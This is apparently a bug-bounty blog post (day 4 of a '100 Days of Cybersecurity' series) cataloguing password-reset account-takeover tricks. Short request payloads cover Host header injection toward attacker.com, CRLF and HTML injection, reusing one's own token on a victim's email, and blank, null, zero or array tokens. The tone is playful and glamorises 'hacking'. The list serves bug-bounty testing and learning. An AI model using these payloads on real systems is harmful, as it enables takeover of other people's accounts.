---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://github.com/thelocalh0st/thelocalh0st.github.io/assets/95465072/77d37890-df5d-43c6-8963-353f8cb4ebbd"> Password Reset Vulnerabilities  
date: 2023-12-12 07:00:02 +730
categories: [Resources, bugbounty]
tags: [bugbounty, password-reset-vuln,100-days-of-cybersecurity] # TAG names should always be lowercase


---


<h1 style="color: cyan; text-align: center">100 Day's Of Cybersecurity - Day 4</h1>
<br><br>
![th-364396762 (1)](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/95465072/6609b668-6523-4436-b31b-e1e405cf670b)

<br>
Hey, hacking enthusiasts! Ready to uncover some mind-blowing tricks? Dive into these HubSpot Full Account Takeover methods and master the hacker's playbook!

## 📧 Using Your Token on Victims' Email



```
POST /reset
email=victim@gmail.com&token=$YOUR-TOKEN$
```

Imagine slipping into someone's email fortress with a cleverly placed token. 🕵️‍♂️

## 🌐 Host Header Injection


```
POST /reset
Host: attacker.com
email=victim@gmail.com`
```

Messing with the host header to sow confusion. Crafty, right?

## 🎭 HTML Injection in Host Header


```
POST /reset
Host: attacker">.com
email=victim@gmail.com
```

Why settle for ordinary when you can inject style into your hacks? 😉

## 🕵️ Leakage of Password Reset in Referer Header


`Referrer: https://website.com/reset?token=1234` 

Spotting hidden treasures in the Referer Header - a classic move in the hacker's handbook.

## 🎭 Using Companies Email


```
While inviting users into your account/organization, you can also try inviting company emails and add a 
new field "password": "example123". or "pass": "example123" in the request. you may end up resetting a user password

Company emails can be found on target's GitHub Repos members or you can check on http://hunter.io. some users
have a feature to set a password for invited emails, so here we can try adding a pass parameter.

If successful, we can use those credentials to login into the account, SSO integrations, support panels,
etc
```
Mixing business with pleasure by exploiting the power of company emails. 🏢💻

## 🚪 CRLF in URL


`/resetPassword?0a%0dHost:atracker.tld` 

Breaking into the reset realm with CRLF magic. 🪄

## 📬 HTML Injection in Email



`HTML injection in email via parameters, cookie, etc > inject image > leak the  token` 

Crafting emails that are not just messages but gateways to breach security. 💻🔓

## 🚮 Remove Token



`/reset?eamil=victims@gmail.com&token=` 

Playing hide and seek with tokens - remove, replace, and conquer. 🕵️‍♀️🎭

## 🔄 Change it to 0000



`/reset?eamil=victims@gmail.com&token=0000000000` 

Transforming tokens like a digital alchemist. ✨

## 🚫 Use Null Value



`/reset?eamil=victims@gmail.com&token=Null/nil` 

Because sometimes, nothing is more powerful than Null. 🧙‍♂️

## 🎲 Try an Array of Old Tokens



`/reset?eamil=victims@gmail.com&token=[oldtoken1,oldtoken2]` 

Rolling the dice with a repertoire of old tokens. 🎲

## 🕵️ SQLi Bypass


`try sqli bypass and wildcard or, %, *` 

In the quest for knowledge, SQLi becomes the secret language. 🤫📜

## 🔄 Request Method / Content Type



`change request method (get, put, post etc) and/or content type (xml<>json)` 

Mastering the art of disguise - because not all requests are created equal. 🎭

## 🔄 Response Manipulation

`Replace bad response and replace with good one` 

Turning the tables by manipulating responses. It's like playing chess with code. ♟️

## 🚀 Massive Token



`/reset?eamil=victims@gmail.com&token=1000000 long string` 

Unleashing the power of the colossal token - because size does matter in the hacking world. 🚀

## 🔗 Crossdomain Token Usage



`If a program has multiple domains using the same underlying reset mechanism...` 

Navigating through domains like a digital acrobat - because sometimes, tokens transcend boundaries. 🌐

## Final Notes 📒 

🔍 Leaking Reset Token in Response Body

 🔄 Change 1 Char at the Begin/End to See if the Token is Evaluated

📬 Use Unicode Char Jutsu to Spoof Email Address

⏱️ Look for Race Conditions

 🔄 Try to Register the Same Mail with Different TLD (.eu, .net, etc)


----------

Hope you enjoy this adventure into the world of bug bounty hunting! Happy hacking!

![](https://media.giphy.com/media/DAtJCG1t3im1G/giphy.gif)
